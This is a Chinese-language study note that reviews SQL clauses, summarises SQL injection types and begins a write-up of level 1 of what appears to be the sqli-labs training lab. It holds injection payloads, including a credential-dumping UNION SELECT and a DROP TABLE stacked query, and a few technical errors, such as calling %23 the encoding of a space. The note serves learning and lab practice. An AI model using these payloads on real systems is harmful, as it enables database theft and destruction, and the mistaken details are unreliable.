## SQL 基础复习

为了在 SQL 注入时，编写 SQL 的过程中不磕磕巴巴，来复习下在 SQL 注入中常见的 SQL 基础知识吧～

### 限制语句 limit

在 SQL 中，LIMIT 语句用于**限制返回的行数**，它通常与 `ORDER BY` 一起使用来分页或获取部分结果，其语法如下所示：

* `offset` : 从结果集的哪一行开始（从 0 开始计数），如果省略 offset，默认从第 0 行开始
* `row_count` : 返回的行数

```sql
SELECT column1, column2, ...
FROM table_name
[WHERE condition]
[ORDER BY column_name [ASC | DESC]]
LIMIT offset, row_count;
```

示例如下所示：

1. **返回前 5 行**：返回按年龄降序排列的前 5 行

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age DESC
   LIMIT 5;
   ```

2. **跳过前 5 行，返回接下来的 10 行**：跳过前 5 行（偏移量为 5），然后返回 10 行

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age ASC
   LIMIT 5, 10;
   ```

3. **用于分页**：假设每页显示 10 行，当前为第 page 页（从 1 开始）

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age
   LIMIT (page - 1) * 10, 10;
   ```



### 排序语句 order by

在 SQL 中，`ORDER BY` 语句用于对查询结果进行排序，可以按照一列或多列的值排序，并选择升序 (`ASC`)（`默认`）或降序 (`DESC`) 排列，其语法如下所示：

```sql
SELECT column1, column2, ...
FROM table_name
ORDER BY column_name [ASC | DESC];
```

示例如下所示：

1. **按单列排序**：根据 age 列的值从小到大排序

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age ASC;
   ```

2. **按多列排序**：先按照 grade 降序排列，若 grade 相同，则再按 age 升序排列

   ```sql
   SELECT name, age, grade
   FROM students
   ORDER BY grade DESC, age ASC;
   ```

3. **按表达式排序**：根据计算列 total_income 降序排列

   ```sql
   SELECT name, salary, bonus, (salary + bonus) AS total_income
   FROM employees
   ORDER BY total_income DESC;
   ```

值得注意的是：ORDER BY 语句支持按列的**编号**进行排序，而不是直接使用列名。这在某些情况下可以使查询更简洁，尤其是列名较长或计算列复杂或**不知道列名**时，其语法如下所示：

```sql
SELECT column1, column2, ...
FROM table_name
ORDER BY 列编号 [ASC | DESC]; -- 列的编号基于 SELECT 子句中列的顺序（从 1 开始）
```

示例如下所示：

1. **按列编号升序排序**：按第 2 列（age）升序排序

   ```sql
   SELECT name, age, grade
   FROM students
   ORDER BY 2 ASC;
   ```

2. **按多列编号排序**：按第 3 列（grade）降序，第2列（age）升序

   ```sql
   SELECT name, age, grade
   FROM students
   ORDER BY 3 DESC, 2 ASC;
   ```

3. **配合计算列**：按第 4 列（total_income）降序排序

   ```sql
   SELECT name, salary, bonus, (salary + bonus) AS total_income
   FROM employees
   ORDER BY 4 DESC;
   ```



### 联合语句 union

在 SQL 中，UNION 用于合并两个或多个 SELECT 语句的查询结果集。它会将结果集中的行合并到一个集合中，并**去除重复的行**。如果希望保留重复行，可以使用 UNION ALL，其语法如下所示：

* 列数和数据类型必须相同
* 表的列名如果太长或**不知道**，可以用**列的编号**来代替列名，其从 1 开始

```sql
SELECT column1, column2, ...
FROM table1
[WHERE condition]
UNION
SELECT column1, column2, ...
FROM table2
[WHERE condition];
```

示例如下所示：

1. **合并两个表的数据**：将 students_2023 和 students_2024 表中学生的 name 和 age 合并，并去除重复行

   ```sql
   SELECT name, age
   FROM students_2023
   UNION
   SELECT name, age
   FROM students_2024;
   ```

   值得注意的是：与 `UNION` 的区别在于，`UNION ALL` 不会去重，**查询性能更高**：

   ```sql
   SELECT name, age
   FROM students_2023
   UNION ALL
   SELECT name, age
   FROM students_2024;
   ```

2. **使用表达式**：将两个表的数据合并在一起，并在结果（只有一列name）中添加一列 education 来标识数据的来源（即每行数据是来自高中学生表还是大学学生表）

   ```sql
   SELECT 'High School' AS education, name
   FROM high_school_students
   UNION
   SELECT 'University' AS education, name
   FROM university_students;
   ```



### 指定别名 as

...pass



## 注入类型总结

以下是常见的 SQL 注入类型及其特点的总结：

### 1.基础 SQL 注入（Classic SQL Injection）

通过直接在输入中插入 SQL 代码，改变原始查询逻辑

* **示例**：输入 `' OR '1'='1` 使条件永远为真

  ```sql
  ' OR '1'='1
  ```

### 2.联合查询注入（UNION-based SQL Injection）

利用 UNION 合并查询结果，获取其他表的数据

* **特点**：要求攻击者能够判断和匹配结果列的数量与类型

  ```sql
  ' UNION SELECT username, password FROM users --
  ```

### 3.盲注（Blind SQL Injection）

服务器没有返回具体错误信息，攻击者通过观察响应的行为推断查询结果

#### 3.1.布尔盲注（Boolean-based Blind Injection）

* **方式**：通过改变条件判断，观察页面返回的变化。

  ```sql
  ' AND 1=1 -- （页面正常）
  ' AND 1=2 -- （页面异常）
  ```

#### 3.2.时间盲注（Time-based Blind Injection）

* **方式**：利用数据库函数（如 `SLEEP()`）使查询延迟，推断结果

  ```sql
  ' AND IF(1=1, SLEEP(5), 0) --
  ```

### 4.错误注入（Error-based SQL Injection）

利用数据库返回的错误信息，获取敏感数据

* **特点**：通过触发错误或函数，直接暴露数据库结构或数据

  ```sql
  ' AND 1=CAST((SELECT @@version) AS INT) --
  ```

### 5.堆查询注入（Stacked Queries Injection）

允许一次执行多个 SQL 语句

* **特点**：需要数据库支持多语句执行（如 ; 分隔）

  ```sql
  '; DROP TABLE users; --
  ```

### 6.基于 XML 的 SQL 注入（Second-Order SQL Injection）

攻击者在初次输入时注入特定字符或语句，等数据被应用后触发注入

* **特点**：数据被存储后，在后续查询时注入生效

### 7.高级注入（Advanced SQL Injection）

结合其他技术（如 JSON、XPath、XML 等）或数据库特性进行复杂攻击



## SQL注入防御策略

* 使用 **参数化查询（Prepared Statements）** 或 ORM
* 验证和过滤用户输入，禁止特殊字符
* 限制数据库用户权限
* 定期检查和修补漏洞



## 第一关

### 源代码分析

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
?>
```

### 构造攻击 SQL

#### 1.报错注入

```sql
id=1'
```

```sql
SELECT * FROM users WHERE id='1'' LIMIT 0,1
```

报错信息 :

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

尝试注释掉第二个符号 `'` 后 SQL 语句：

```sql
id=1'--+
```

```sql
SELECT * FROM users WHERE id='1'-- ' LIMIT 0,1 (通过 URL 解码后，`+`变成空格)
```

值得注意的是：在 SQL 中，`--` 是行注释符，**但在某些数据库（如 MySQL）中，`--` 后面必须跟一个空格才能生效**，上述 SQL 注入语句中之所以在 `--` 后加 `+`，是因为在 SQL 注入中，有时无法直接在 `--` 后加空格（**例如在 URL 参数末尾输入空格符，空格可能被编码或移除**），此时使用 `+` 代替空格，这样可以保证注释符生效，正确注释掉后续内容 .

* **`+` 在 URL 编码中表示空格，通过 URL 解码后，`--+` 实际变成 `--(空格)`**

所以说只要能确保注释符生效，SQL注入语句也可写成下述形式，这里的 `s` 可以为任何其它字母，其作用是确保在 URL 编码时前面的空格不被移除.

```sql
id=1'-- s
```

```sql
SELECT * FROM users WHERE id='1'-- s' LIMIT 0,1
```

对了，空格符号经过 URL 编码后，会变成 `%23`，而符号 `'` 则会变成 `%27`，所以上述 SQL 注入语句也可写成下述形式 : 

```sql
id=1%27--%20
```

#### 2.联合查询注入

由上述 `1.报错注入` 中已收集的信息可得，`id` 是字符型，且代码中未过滤及转义恶意代码，故源码中的 SQL 语句经推测，大概是这样写的 : 

```sql
SELECT ... FROM ... WHERE id = '{id}' ...
```

接下来我们可以利用 `联合查询注入` 先来查询数据库名，---> 然后根据数据库名查询表名，---> 再然后根据表名查询表字段名，---> 最后根据表名及字段名查询出我们想要的数据！是不是很 Hacker，Let's hack it  now !!!

But，使用联合查询（Union Select）的前提是表的列数是已知的！如何获取表的列表呢？答：使用 `order by` 语句！

...pass